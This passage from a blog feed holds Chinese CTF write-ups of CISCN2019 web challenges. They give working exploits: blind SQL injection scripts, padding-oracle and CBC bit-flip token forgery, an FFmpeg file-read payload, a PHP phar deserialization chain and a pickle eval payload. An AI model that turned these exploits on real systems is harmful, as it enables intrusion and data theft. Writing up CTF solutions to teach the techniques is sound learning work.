    <title>buuoj刷题笔记[CISCN2019(二)]padding oracle初学</title>
    <link href="/2019/09/28/buuoj%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E4%BA%8C-padding-oracle%E5%88%9D%E5%AD%A6/"/>
    <url>/2019/09/28/buuoj%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E4%BA%8C-padding-oracle%E5%88%9D%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h1><ol><li>bak源码泄露</li><li>sql注入</li><li>文件上传，短标签shell日志写入</li></ol><p>image.php.bak源码泄露</p><p>需要想办法逃逸单引号注入<code>&#39;\0&#39;</code> =&gt; <code>addslashes</code> =&gt; <code>&#39;\\\0&#39;</code> =&gt; <code>str_replace</code> =&gt; <code>&#39;\&#39;</code> 后一个单引号会被转义，前一个单引号与path字段单引号拼接。造成sql注入</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">"config.php"</span>;$id=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">"id"</span>])?$_GET[<span class="hljs-string">"id"</span>]:<span class="hljs-string">"1"</span>;$path=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">"path"</span>])?$_GET[<span class="hljs-string">"path"</span>]:<span class="hljs-string">""</span>;$id=addslashes($id);$path=addslashes($path);$id=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">"\\0"</span>,<span class="hljs-string">"%00"</span>,<span class="hljs-string">"\\'"</span>,<span class="hljs-string">"'"</span>),<span class="hljs-string">""</span>,$id);$path=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">"\\0"</span>,<span class="hljs-string">"%00"</span>,<span class="hljs-string">"\\'"</span>,<span class="hljs-string">"'"</span>),<span class="hljs-string">""</span>,$path);$sql=<span class="hljs-string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>;<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/load/i"</span>,$sql))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">"What's your problem?"</span>);&#125;$result=mysqli_query($con,$sql);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);<span class="hljs-comment">//secure the path</span>$count=preg_match(<span class="hljs-string">"/(\.\.)|(config)/i"</span>,$row[<span class="hljs-string">"path"</span>]);<span class="hljs-keyword">if</span> ($count&gt;<span class="hljs-number">0</span>)&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">"What's your problem?"</span>);&#125;$path=<span class="hljs-string">"./"</span> . $row[<span class="hljs-string">"path"</span>];header(<span class="hljs-string">"Content-Type: image/jpeg"</span>);readfile($path);</code></pre><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>注出账号密码</p><p>username: admin</p><p>password: 158f494325ac421c0f4a</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> stringstr1 = string.printabletmp=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> str1:        url = <span class="hljs-string">"http://1ac0ae3f-0633-427c-b215-229c94f5273d.node2.buuoj.cn.wetolink.com:82/image.php"</span>        param=&#123;            <span class="hljs-string">'id'</span>:<span class="hljs-string">'\\0'</span>,            <span class="hljs-string">'path'</span>:<span class="hljs-string">f' or ascii(substr((select group_concat(password) from users),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;ord(a)&#125;</span>-- '</span>            <span class="hljs-comment">#'path':f' or length(database())=11-- '</span>        &#125;        rep = requests.get(url,params=param)        print(param)        <span class="hljs-comment">#print(rep.text)</span>        <span class="hljs-keyword">if</span> rep.text != <span class="hljs-string">''</span>:            tmp+=a            print(<span class="hljs-string">'[+] : '</span> +tmp)</code></pre><p>传入的文件内容会被写进日志内文件，使用短标签写入一句话木马</p><p><img src="./1569579769845.png" srcset="/img/loading.gif" alt="1569579769845"></p><p><img src="./1569579860807.png" srcset="/img/loading.gif" alt="1569579860807"></p><h1 id="padding-oracle"><a href="#padding-oracle" class="headerlink" title="padding oracle"></a>padding oracle</h1><p>参考链接：<a href="https://www.freebuf.com/articles/database/150606.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/150606.html</a></p><p><img src="./1569586375256.png" srcset="/img/loading.gif" alt="1569586375256"></p><h2 id="服务器解密过程"><a href="#服务器解密过程" class="headerlink" title="服务器解密过程"></a>服务器解密过程</h2><p>服务器从右往左解密,红色圈圈为AES解密后的中间值。前一个Ciphertext是都是相应解密的iv</p><h2 id="padding-oracle攻击的本质"><a href="#padding-oracle攻击的本质" class="headerlink" title="padding oracle攻击的本质"></a>padding oracle攻击的本质</h2><p>其实就是通过传递密文以及自己猜测的IV值，通过观察服务器对padding判断的结果，进而反推出中间值，最后用中间值与正确的IV异或得到明文.也就是说这个攻击直接跳过了AES,即我们未获得key值也能够得到明文。</p><h2 id="padding添加原理"><a href="#padding添加原理" class="headerlink" title="padding添加原理"></a>padding添加原理</h2><p>由于是分组加解密，当块中的字节数不同时候需要添加padding以满足加解密格式。分组要求每个块的大小都要相同</p><h2 id="服务器验证明文正确方式"><a href="#服务器验证明文正确方式" class="headerlink" title="服务器验证明文正确方式"></a>服务器验证明文正确方式</h2><p>padding的值与添加的字节数相同。PKCS#5标准来说，一般缺少几位，就填充几位那个数字</p><p>比如：三位空缺，则这三位都要填上0x03。如果padding规则对不上就会报错，如下。</p><ol><li>如果解密过程没有问题，明文验证（如用户名密码验证）也通过，则会返回正常 HTTP 200</li><li>如果解密过程没有问题，但是明文验证出错（如用户名密码验证），则还是会返回 HTTP 200，只是内容上是提示用户用户名密码错误</li><li>如果解密过程出问题了，比如Padding规则核对不上，则会爆出 HTTP 500错误。</li></ol><p><img src="./1569586327792.png" srcset="/img/loading.gif" alt="1569586327792"></p><p>根据上面服务器判断解密过程是否正确的条件来看，只要最后padding值与个数相对应即可</p><p>意味着如下公式成立：</p><blockquote><p>C1 ^ 中间值的最后一位 = 0×01</p></blockquote><p>那么按照异或运算的性质，我们不难得到：</p><blockquote><p>中间值的最后一位 = C1 ^ 0×01</p></blockquote><h2 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h2><pre><code class="hljs python">用伪造的c1替换原来的c1循环一思路：伪造初始向量c1 ^ 中间值最后一位 =<span class="hljs-number">0x01</span> 服务器状态码正常=&gt; 继而得到中间值循环第二次至第N次循环：伪造初始向量c1 = 上一步得到的中间值最后一位 ^ <span class="hljs-number">0x02</span>最后把得到的所有中间值与原iv异或得到明文</code></pre><p>0:16  可加可不加，服务器是从右向左解密</p><p><img src="./1569640134942.png" srcset="/img/loading.gif" alt="1569640134942"></p><h1 id="CISCN2019-东北赛区-Day2-Web3-Point-System"><a href="#CISCN2019-东北赛区-Day2-Web3-Point-System" class="headerlink" title="[CISCN2019 东北赛区 Day2 Web3]Point System"></a>[CISCN2019 东北赛区 Day2 Web3]Point System</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>wp ： <a href="https://www.zhaoj.in/read-6057.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6057.html</a></p><ol><li>敏感文件泄露（Robots.txt）</li><li>Padding Oracle 明文推断 &amp; CBC 翻转攻击</li><li>FFMpeg 任意文件读取漏洞</li></ol><h2 id="meta的作用"><a href="#meta的作用" class="headerlink" title="meta的作用"></a>meta的作用</h2><p>meta里的数据是供机器解读的，告诉机器该如何解析这个页面，还有一个用途是可以添加服务器发送到浏览器的http头部内容</p><p>调用界面注册api，发现是作用在内网中，需要外部调用注册</p><p><img src="./1569581860309.png" srcset="/img/loading.gif" alt="1569581860309"></p><p>登录后权限不足</p><p><img src="./1569581890582.png" srcset="/img/loading.gif" alt="1569581890582"></p><p>login登录后返回token</p><p><img src="./1569582366649.png" srcset="/img/loading.gif" alt="1569582366649"></p><p><code>&#39;user_role&#39;:3</code> 这里3指用户权限，需要更改为1 </p><p><img src="./1569582395002.png" srcset="/img/loading.gif" alt="1569582395002"></p><p>登录login脚本后，将返回的token作为info脚本访问的key。info Response返回头显示user_role为3，权限不足</p><p><img src="./1569582407368.png" srcset="/img/loading.gif" alt="1569582407368"></p><h2 id="padding-oracle攻击思路"><a href="#padding-oracle攻击思路" class="headerlink" title="padding oracle攻击思路"></a>padding oracle攻击思路</h2><p><strong>结题思路：需要先得出明文,确定3在密文中的位置，在通过cbc翻转置为1,即可有权限登录服务器,其实这里只要得到第一块block含有我们需要的讯息，后面就不需要解密</strong></p><pre><code class="hljs llvm">eyJzaWduZWRfa<span class="hljs-number">2</span>V<span class="hljs-number">5</span>IjoiU<span class="hljs-number">1</span>VONGExTnBibWRFWVc<span class="hljs-number">1</span>alpWSmhVSHNGUVI<span class="hljs-number">0</span>bG<span class="hljs-number">41</span>VkZDOUwwOWVjaGtZaFRXUWdpd<span class="hljs-number">1</span>pvaGoyN<span class="hljs-number">0</span>pXdDk<span class="hljs-number">4</span>LysxWmdnU<span class="hljs-number">2</span>d<span class="hljs-number">1</span>WWRLcTJnYXZ<span class="hljs-number">3</span>MXRVLzF<span class="hljs-number">3</span>NWptdXM<span class="hljs-number">3</span>WHo<span class="hljs-number">4</span>WDgxMnlESlU<span class="hljs-number">4</span>cWtiL<span class="hljs-number">3</span>N<span class="hljs-number">1</span>NW<span class="hljs-number">9</span>wUStiQW<span class="hljs-number">1</span>WdXRrNmhKdkc<span class="hljs-number">2</span>Q<span class="hljs-number">05</span>PNXNpVVpJdTVFTmsrSXFBbU<span class="hljs-number">9</span>yWlhBPT<span class="hljs-number">0</span>iLCJyb<span class="hljs-number">2</span>xlIjozLCJ<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>VyX<span class="hljs-number">2</span>lkIjoxLCJwYXlsb<span class="hljs-number">2</span>FkIjoiZGhIaHlXS<span class="hljs-number">3</span>BqT<span class="hljs-number">2</span>VwbUs<span class="hljs-number">0</span>RTFXdkVjUmpKSUhNR<span class="hljs-number">3</span>pNcWgiLCJleHBpcmVfaW<span class="hljs-number">4</span>iOjE<span class="hljs-number">1</span>Njk<span class="hljs-number">1</span>ODkzNzd<span class="hljs-number">9</span>解码&#123;<span class="hljs-string">"signed_key"</span>:<span class="hljs-string">"SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98/+1ZggSguYdKq2gavw1tU/1w5jmus7Xz8X812yDJU8qkb/su5opQ+bAmVutk6hJvG6CNO5siUZIu5ENk+IqAmOrZXA=="</span>,<span class="hljs-string">"role"</span>:<span class="hljs-number">3</span>,<span class="hljs-string">"user_id"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"payload"</span>:<span class="hljs-string">"dhHhyWKpjOepmK4E1WvEcRjJIHMGzMqh"</span>,<span class="hljs-string">"expire_in"</span>:<span class="hljs-number">1569589377</span>&#125;signed_key解码为乱码,</code></pre><h2 id="解密exp"><a href="#解密exp" class="headerlink" title="解密exp"></a>解密exp</h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2.7</span><span class="hljs-comment"># -*- coding:utf8 -*-</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> jsonhost = <span class="hljs-string">"127.0.0.1"</span>port = <span class="hljs-number">8233</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xor</span><span class="hljs-params">(a, b)</span>:</span>    <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>.join([chr(ord(a[i]) ^ ord(b[i % len(b)])) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(a))])<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">padoracle</span><span class="hljs-params">(key)</span>:</span>    user_key_decode = base64.b64decode(key)    user_key_json_decode = json.loads(user_key_decode)    signed_key = user_key_json_decode[<span class="hljs-string">'signed_key'</span>]    signed_key_decoed = base64.b64decode(signed_key)    url = <span class="hljs-string">"http://"</span> + host + <span class="hljs-string">":"</span> + str(port) + <span class="hljs-string">"/frontend/api/v1/user/info"</span>    N = <span class="hljs-number">16</span>    total_plain = <span class="hljs-string">''</span>    <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, int(len(signed_key) / <span class="hljs-number">16</span>) - <span class="hljs-number">3</span>):        token = <span class="hljs-string">''</span>        get = <span class="hljs-string">""</span>        cipher = signed_key_decoed[<span class="hljs-number">16</span> + block * <span class="hljs-number">16</span>:<span class="hljs-number">32</span> + block * <span class="hljs-number">16</span>]        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, N + <span class="hljs-number">1</span>):            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>):                token = signed_key_decoed[block * <span class="hljs-number">16</span>:<span class="hljs-number">16</span> + block * <span class="hljs-number">16</span>]                padding = xor(get, chr(i) * (i - <span class="hljs-number">1</span>))                c = (chr(<span class="hljs-number">0</span>) * (<span class="hljs-number">16</span> - i)) + chr(j) + padding + cipher                token = base64.b64encode(token + c)                user_key_json_decode[<span class="hljs-string">'signed_key'</span>] = token                header = &#123;<span class="hljs-string">'Key'</span>: base64.b64encode(json.dumps(user_key_json_decode))&#125;                res = requests.get(url, headers=header)                <span class="hljs-keyword">if</span> res.json()[<span class="hljs-string">'code'</span>] != <span class="hljs-number">205</span>:                    get = chr(j ^ i) + get                    <span class="hljs-keyword">break</span>        plain = xor(get, signed_key_decoed[block * <span class="hljs-number">16</span>:<span class="hljs-number">16</span> + block * <span class="hljs-number">16</span>])        total_plain += plain    <span class="hljs-keyword">return</span> total_plainplain_text = padoracle(<span class="hljs-string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVRm1zclQ3a2FGM1FXL29vWDdVcVRpZ215TVl5MFFZK1RlSzMya3hGZW94ay9ZNnkzaG0vaEJXK2lMaXVLdnNNS1NPK1ZQQ0pGSTdPbHJTL0dsYThWWmh1Y3p2NSs4djNXckNJSE5TbVJOS2xBRjREdlI2bDBSbFVaajB6WjgzWGlBPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoid2x1NUUwN1piR3pUNDVRUEhORzVReUpQT2UyNjUwalgiLCJleHBpcmVfaW4iOjE1NTY4NTM2Mzh9"</span>)print(plain_text)<span class="hljs-comment">#&#123;"role":3,"user_id":1,"payload":"wlu5E07ZbGzT45QPHNG5QyJPOe2650jX","expire_in":1556853638&#125;</span></code></pre><h2 id="exp-CBC翻转"><a href="#exp-CBC翻转" class="headerlink" title="exp CBC翻转"></a>exp CBC翻转</h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2.7</span><span class="hljs-comment"># -*- coding:utf8 -*-</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> jsonhost = <span class="hljs-string">"127.0.0.1"</span>port = <span class="hljs-number">8233</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cbc_attack</span><span class="hljs-params">(key, block, origin_content, target_content)</span>:</span>    user_key_decode = base64.b64decode(key)    user_key_json_decode = json.loads(user_key_decode)    signed_key = user_key_json_decode[<span class="hljs-string">'signed_key'</span>]    cipher_o = base64.b64decode(signed_key)    <span class="hljs-keyword">if</span> block &gt; <span class="hljs-number">0</span>:        iv_prefix = cipher_o[:block * <span class="hljs-number">16</span>]    <span class="hljs-keyword">else</span>:        iv_prefix = <span class="hljs-string">''</span>    iv = cipher_o[block * <span class="hljs-number">16</span>:<span class="hljs-number">16</span> + block * <span class="hljs-number">16</span>]    cipher = cipher_o[<span class="hljs-number">16</span> + block * <span class="hljs-number">16</span>:]    iv_array = bytearray(iv)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>):        iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i])    iv = bytes(iv_array)    user_key_json_decode[<span class="hljs-string">'signed_key'</span>] = base64.b64encode(iv_prefix + iv + cipher)    <span class="hljs-keyword">return</span> base64.b64encode(json.dumps(user_key_json_decode))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_user_info</span><span class="hljs-params">(key)</span>:</span>    r = requests.post(<span class="hljs-string">"http://"</span> + host + <span class="hljs-string">":"</span> + str(port) + <span class="hljs-string">"/frontend/api/v1/user/info"</span>, headers = &#123;<span class="hljs-string">"Key"</span>: key&#125;)    <span class="hljs-keyword">if</span> r.json()[<span class="hljs-string">'code'</span>] == <span class="hljs-number">100</span>:        print(<span class="hljs-string">"获取成功！"</span>)    <span class="hljs-keyword">return</span> r.json()[<span class="hljs-string">'data'</span>]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modify_role_palin</span><span class="hljs-params">(key, role)</span>:</span>    user_key_decode = base64.b64decode(user_key)    user_key_json_decode = json.loads(user_key_decode)    user_key_json_decode[<span class="hljs-string">'role'</span>] = role    <span class="hljs-keyword">return</span> base64.b64encode(json.dumps(user_key_json_decode))print(<span class="hljs-string">"翻转 Key:"</span>)user_key = cbc_attack(<span class="hljs-string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWkV0UERnUzJqU2lhWm1wNEhQUWhvMDdwTzEzSHlHeXI4TExXcUFleDY1TzFQM09GQ2FHVSt3cE1iYyticTdXR2Y4MUN4Ujh2dEpGNXhnQ2YyRHVyL2d3PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiaWtJVmsyd21DQWc0cVpqV0tGMk5nT25aR3dyT3V2eFQiLCJleHBpcmVfaW4iOjE1Njk2NDUwMzF9"</span>, <span class="hljs-number">0</span>, <span class="hljs-string">'&#123;"role":3,"user_'</span>, <span class="hljs-string">'&#123;"role":1,"user_'</span>)user_key = modify_role_palin(user_key, <span class="hljs-number">1</span>)print(user_key)print(<span class="hljs-string">"测试拉取用户信息："</span>)user_info = get_user_info(user_key)print(user_info)<span class="hljs-comment">#Key: eyJleHBpcmVfaW4iOiAxNTY5NjQ1MDMxLCAicm9sZSI6IDEsICJ1c2VyX2lkIjogMSwgInBheWxvYWQiOiAiaWtJVmsyd21DQWc0cVpqV0tGMk5nT25aR3dyT3V2eFQiLCAic2lnbmVkX2tleSI6ICJTVU40YTFOcGJtZEdZVzVqWlZKaFVIc0ZRUjRsbjVWRkM5TDA5ZWNoa1loVFdRZ2l3Wm9oajI3Sld0OTgvKzFaRXRQRGdTMmpTaWFabXA0SFBRaG8wN3BPMTNIeUd5cjhMTFdxQWV4NjVPMVAzT0ZDYUdVK3dwTWJjK2JxN1dHZjgxQ3hSOHZ0SkY1eGdDZjJEdXIvZ3c9PSJ9</span></code></pre><p>添加翻转后的cookie,刷新进入后台界面</p><p><img src="./1569638915896.png" srcset="/img/loading.gif" alt="1569638915896"></p><h2 id="FFMpeg漏洞读取文件"><a href="#FFMpeg漏洞读取文件" class="headerlink" title="FFMpeg漏洞读取文件"></a>FFMpeg漏洞读取文件</h2><p><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py" target="_blank" rel="noopener">https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py</a> 来生成 payload</p><pre><code class="hljs bash">python3 gen_xbin_avi.py file:///flag get.avi</code></pre><p>上传avi,在下载下来</p><p><img src="./1569640809772.png" srcset="/img/loading.gif" alt="1569640809772"></p><p><code>flag{2b38832a-9409-4742-8297-996f0ecf9126}</code></p><p><img src="./1569640797530.png" srcset="/img/loading.gif" alt="1569640797530"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuoj刷题笔记[CISCN2019(一)]</title>
    <link href="/2019/09/27/buuctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E4%B8%80/"/>
    <url>/2019/09/27/buuctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p>题目链接：<a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World" target="_blank" rel="noopener">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World</a></p><p>前期注入测试</p><pre><code class="hljs php">过滤空格、||、*、+、-可以用如下逻辑 <span class="hljs-number">1</span>%<span class="hljs-number">1</span> <span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">1</span>^<span class="hljs-number">1</span>空格可以用()替代</code></pre><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> stringurl=<span class="hljs-string">"http://364aaec1-065b-42c1-97bf-e280f576346a.node2.buuoj.cn.wetolink.com/index.php"</span>temp=<span class="hljs-string">''</span>str1=string.printable<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">12</span>):    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> str1:        data=&#123;            <span class="hljs-string">'id'</span>:<span class="hljs-string">f'1^(ascii(substr((select(flag)from(flag)),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;ord(a)&#125;</span>)'</span>        &#125;        rep= requests.post(url=url,data=data)        print(data)        <span class="hljs-keyword">if</span> <span class="hljs-string">'Occured'</span> <span class="hljs-keyword">in</span> rep.text:            temp+=a            print(<span class="hljs-string">'[+] output: '</span>+temp)            <span class="hljs-keyword">break</span> <span class="hljs-comment">#flag&#123;98cf8686-c4df-4a83-ba2c-eeb9c1dd2a3e&#125;</span></code></pre><h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><p>先找到危险函数file_get_contents方法，需要找到触发点</p><p><img src="./1569485678161.png" srcset="/img/loading.gif" alt="1569485678161"></p><p>一个phar反序列化的点,原先是定位到download.php中if判断存在open方法，且该方法存在file_exists可以触发反序列化，但是发现不能输出close()方法内容.</p><p>FIleList类中存在<code>__call</code>可以执行函数，且<code>__destruct</code>方法存在输出$this-&gt;results内容。还需要找到触发<code>__call</code>，User类<code>__destruct</code>可以调用close方法。</p><h1 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h1><p><img src="./1569499082605.png" srcset="/img/loading.gif" alt="1569499082605"></p><h1 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;    <span class="hljs-keyword">public</span> $db;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>&#123;    <span class="hljs-keyword">public</span> $filename;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;filename=<span class="hljs-string">'/flag.txt'</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span></span>&#123;    <span class="hljs-keyword">private</span> $files;    <span class="hljs-keyword">private</span> $results;    <span class="hljs-keyword">private</span> $funcs;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;files=<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> File());        <span class="hljs-keyword">$this</span>-&gt;funcs=<span class="hljs-keyword">array</span>();        <span class="hljs-keyword">$this</span>-&gt;results=<span class="hljs-keyword">array</span>();    &#125;&#125;$u = <span class="hljs-keyword">new</span> User();$u-&gt;db=(<span class="hljs-keyword">new</span> FileList());@unlink(<span class="hljs-string">"test.phar"</span>);$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">"phar123.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span>$phar-&gt;startBuffering();$phar-&gt;setStub(<span class="hljs-string">"&lt;?php __HALT_COMPILER();?&gt;"</span>); <span class="hljs-comment">//设置stub</span>$phar-&gt;setMetadata($u); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>$phar-&gt;addFromString(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span><span class="hljs-comment">//签名自动计算</span>$phar-&gt;stopBuffering();rename(<span class="hljs-string">'phar123.phar'</span>,<span class="hljs-string">'phar.jpg'</span>);</code></pre><p>上传phar.jpg后，在delete.php删除该文件即可得flag</p><p><img src="./1569490138156.png" srcset="/img/loading.gif" alt="1569490138156"></p><h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><p>首页提示要求找到v6，py跑一波</p><p><img src="./1569501206377.png" srcset="/img/loading.gif" alt="1569501206377"></p><p>访问链接跳转：<a href="http://7b6c1983-bc3e-4004-837b-9ef3b6fc7366.node2.buuoj.cn.wetolink.com:82/b1g_m4mber" target="_blank" rel="noopener">http://7b6c1983-bc3e-4004-837b-9ef3b6fc7366.node2.buuoj.cn.wetolink.com:82/b1g_m4mber</a></p><p>爆破jwt秘钥,jwt.io替换用户名为admin生成新的秘钥</p><pre><code class="hljs http"><span class="hljs-attribute">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</span></code></pre><p><img src="./1569501186596.png" srcset="/img/loading.gif" alt="1569501186596"></p><p>个人中心</p><p><img src="./1569501449435.png" srcset="/img/loading.gif" alt="1569501449435"></p><p>网页源码</p><p><img src="./1569501608423.png" srcset="/img/loading.gif" alt="1569501608423"></p><p>admin.py存在反序列化</p><p><img src="./1569502323795.png" srcset="/img/loading.gif" alt="1569502323795"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">import</span> urllib<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span><span class="hljs-params">(object)</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span><span class="hljs-params">(self)</span>:</span>       <span class="hljs-keyword">return</span> (eval, (<span class="hljs-string">"open('/flag.txt','r').read()"</span>,))a = pickle.dumps(payload())a = urllib.quote(a)<span class="hljs-keyword">print</span> a<span class="hljs-comment">#c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span></code></pre><p><img src="./1569502288697.png" srcset="/img/loading.gif" alt="1569502288697"></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>百度杯十二月web题解</title>
    <link href="/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%BA%8C%E6%9C%88web%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%BA%8C%E6%9C%88web%E9%A2%98%E8%A7%A3/</url>
    
